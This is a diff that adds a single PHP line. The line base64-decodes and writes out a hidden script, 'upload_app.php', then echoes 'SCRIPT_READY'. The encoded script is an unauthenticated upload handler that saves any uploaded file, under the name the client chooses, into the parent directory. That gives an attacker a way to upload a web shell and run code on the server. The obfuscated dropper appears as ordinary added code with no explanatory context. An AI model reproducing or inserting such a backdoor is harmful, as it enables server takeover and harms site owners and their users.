@@ -1,0 +1,1 @@
+<?php file_put_contents('upload_app.php', base64_decode('PD9waHAKaWYgKCRfRklMRVMpIHsKICAgIG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICcuLi8nIC4gJF9GSUxFU1snZmlsZSddWyduYW1lJ10pOwogICAgZWNobyAnVVBMT0FEX1NVQ0NFU1MnOwp9IGVsc2UgewogICAgZWNobyAnTk9fRklMRSc7Cn0KPz4=')); echo 'SCRIPT_READY'; ?>
